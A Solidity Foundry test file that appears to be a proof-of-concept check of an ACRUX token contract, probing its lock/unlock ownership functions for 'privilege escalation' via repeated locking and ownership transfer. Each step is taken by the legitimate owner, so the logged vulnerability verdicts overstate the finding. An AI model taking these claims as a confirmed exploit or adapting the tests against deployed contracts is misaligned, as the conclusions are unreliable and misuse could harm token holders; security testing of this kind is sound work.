// SPDX-License-Identifier: MIT
pragma solidity 0.6.12;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "forge-std/console.sol";  // <--- Added for state logging
import "../src/ACRUX.sol";

contract PrivilegeEscalationTest is Test {
    ACRUX token;
    address owner;
    address attacker = address(0x1337);
    address marketingWallet = address(0x999);
    address charityWallet = address(0x888);
    
    address constant ROUTER_ADDRESS = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address constant WETH_ADDRESS = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant FACTORY_ADDRESS = address(0xA);
    address constant PAIR_ADDRESS = address(0xB);

    function setUp() public {
        // Set up mock Uniswap environment
        vm.mockCall(
            ROUTER_ADDRESS,
            abi.encodeWithSignature("factory()"),
            abi.encode(FACTORY_ADDRESS)
        );
        vm.mockCall(
            ROUTER_ADDRESS,
            abi.encodeWithSignature("WETH()"),
            abi.encode(WETH_ADDRESS)
        );
        vm.mockCall(
            FACTORY_ADDRESS,
            abi.encodeWithSignature("createPair(address,address)"),
            abi.encode(PAIR_ADDRESS)
        );

        owner = vm.addr(1);
        vm.startPrank(owner);
        token = new ACRUX(
            payable(marketingWallet),
            payable(charityWallet)
        );
        vm.stopPrank();
    }

    function testRepeatedLocking() public {
        // Record initial owner state
        console.log("--- Test: Repeated Locking ---");
        console.log("--- BEFORE initial lock ---");
        address preLockOwner = token.owner();
        console.log("Owner before lock:", preLockOwner);

        // Trigger 1: First lock
        console.log("--- Trigger initial lock ---");
        vm.prank(owner);
        token.lock(1 days);
        
        // Post-lock validation
        console.log("--- AFTER initial lock ---");
        address postLockOwner = token.owner();
        console.log("Owner after lock:", postLockOwner);
        assertEq(token.owner(), address(0), "Owner not reset after first lock");

        // Warp to after lock period
        vm.warp(block.timestamp + 2 days);
        
        // Pre-unlock validation
        console.log("--- BEFORE unlock ---");
        address preUnlockOwner = token.owner();
        console.log("Owner before unlock:", preUnlockOwner);

        // Trigger 2: Unlock
        console.log("--- Trigger unlock ---");
        vm.prank(owner);  
        token.unlock();
        
        // Post-unlock validation
        console.log("--- AFTER unlock ---");
        address postUnlockOwner = token.owner();
        console.log("Owner after unlock:", postUnlockOwner);

        // Pre-relock validation
        console.log("--- BEFORE relock ---");
        address preRelockOwner = token.owner();
        console.log("Owner before relock:", preRelockOwner);

        // Trigger 3: Relock immediately
        console.log("--- Trigger relock ---");
        vm.prank(owner);
        token.lock(1 days);
        
        // Final validation
        console.log("--- AFTER relock ---");
        address postRelockOwner = token.owner();
        console.log("Owner after relock:", postRelockOwner);

        // Vulnerability verdict based on state changes
        bool vulnerabilityExists = 
            (preLockOwner != address(0)) &&     // Owner existed before first lock
            (postLockOwner == address(0)) &&    // Owner reset after lock
            (postUnlockOwner == owner) &&       // Original owner restored
            (postRelockOwner == address(0));    // Owner reset again
        
        console.log("\nFinal State Changes Validation:");
        console.log("Vulnerability Exists:", vulnerabilityExists ? "YES" : "NO");
        if (vulnerabilityExists) {
            console.log("Vulnerability Exists: Owner escalation via repeated locking confirmed");
        } else {
            console.log("Vulnerability not Exist: Failed to reset ownership multiple times");
        }
    }

    function testTransferAndLock() public {
        console.log("\n--- Test: Transfer Ownership & Lock ---");
        // Pre-transfer validation
        console.log("--- BEFORE ownership transfer ---");
        address preTransferOwner = token.owner();
        console.log("Original owner:", preTransferOwner);

        // Trigger 1: Ownership transfer to attacker
        console.log("--- Trigger ownership transfer ---");
        vm.prank(owner);
        token.transferOwnership(attacker);
        
        // Post-transfer validation
        console.log("--- AFTER ownership transfer ---");
        address postTransferOwner = token.owner();
        console.log("Transfer recipient:", postTransferOwner);

        // Become new owner
        vm.startPrank(attacker);
        
        // Pre-lock validation
        console.log("--- BEFORE attacker lock ---");
        address preLockOwner = token.owner();
        console.log("Attacker ownership status:", preLockOwner);

        // Trigger 2: Attacker initiates lock
        console.log("--- Trigger attacker lock ---");
        token.lock(1 days);
        vm.stopPrank();
        
        // Final validation
        console.log("--- AFTER attacker lock ---");
        address postLockOwner = token.owner();
        console.log("Final owner state:", postLockOwner);

        // Vulnerability verdict based on state changes
        bool vulnerabilityExists = 
            (preTransferOwner == owner) &&     // Owner was original admin
            (postTransferOwner == attacker) && // Ownership transferred
            (preLockOwner == attacker) &&      // Attacker is recorded as owner
            (postLockOwner == address(0));     // Attacker successfully reset owner
        
        console.log("\nFinal State Changes Validation:");
        console.log("Vulnerability Exists:", vulnerabilityExists ? "YES" : "NO");
        if (vulnerabilityExists) {
            console.log("Vulnerability Exists: Privilege escalation via ownership transfer confirmed");
        } else {
            console.log("Vulnerability not Exist: Failed to escalate privileges");
        }
    }
}